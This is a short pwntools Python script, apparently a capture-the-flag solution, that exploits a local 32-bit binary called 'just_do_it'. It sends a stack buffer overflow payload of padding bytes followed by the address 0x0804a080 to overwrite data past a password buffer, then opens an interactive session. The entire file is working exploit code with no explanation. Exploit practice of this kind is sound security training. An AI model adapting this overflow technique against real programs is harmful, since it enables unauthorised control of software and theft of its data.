from pwn import *

def debug(argc = ''):
    gdb.attach(io, argc)
    pause()

io = process('./just_do_it')
context.arch='i386'
context.log_level='debug'

io.recvuntil(b'Input the password.\n')
payload = flat([b'@'*(0x20-0xc), 0x0804a080])
io.sendline(payload)

io.interactive()
